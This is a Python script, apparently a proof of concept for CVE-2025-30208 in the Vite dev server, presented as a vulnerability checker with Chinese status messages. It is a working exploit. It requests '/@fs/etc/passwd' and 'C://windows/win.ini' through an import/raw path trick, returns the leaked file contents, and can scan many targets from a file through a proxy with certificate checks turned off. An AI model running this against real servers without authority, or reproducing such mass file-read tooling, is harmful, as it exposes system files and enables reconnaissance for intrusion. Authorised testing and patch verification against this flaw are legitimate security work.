import requests
import argparse
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def check_vul(url, proxy=None):
    proxies = {"http": proxy, "https": proxy} if proxy else None
    headers = {"User-Agent": "Mozilla/5.0"}

    try:
        # Linux Payload
        linux_payload = url.rstrip("/") + "/@fs/etc/passwd?import&raw?&"
        lin_resp = requests.get(linux_payload, headers=headers, proxies=proxies, verify=False, timeout=10)
        if "root:" in lin_resp.text:
            print(f"[!!!] 漏洞存在 (Linux): {url}")
            return lin_resp.text

        # Windows Payload
        win_payload = url.rstrip("/") + "/@fs/C://windows/win.ini?import&raw?&"
        win_resp = requests.get(win_payload, headers=headers, proxies=proxies, verify=False, timeout=10)
        if "; for 16-bit app support" in win_resp.text.lower():
            print(f"[!!!] 漏洞存在 (Windows): {url}")
            return win_resp.text

        print(f"[+] 未发现漏洞: {url}")
    except Exception as e:
        print(f"[!] 请求失败: {url} - {e}")

    return None

def main():
    parser = argparse.ArgumentParser(description="CVE-2025-30208 Vite文件读取漏洞检测")
    parser.add_argument("-u", "--url", help="目标 URL（例如 http://ip:port）")
    parser.add_argument("-f", "--file", help="包含多个 URL 的文件（每行一个）")
    parser.add_argument("-p", "--proxy", help="代理（例如 http://127.0.0.1:8080）")

    args = parser.parse_args()

    targets = []

    if args.url:
        targets.append(args.url.strip())
    elif args.file:
        with open(args.file, "r") as f:
            targets = [line.strip() for line in f if line.strip()]
    else:
        parser.print_help()
        return

    print("[*] 开始检测...\n")

    for target in targets:
        check_vul(target, proxy=args.proxy)

if __name__ == "__main__":
    main()
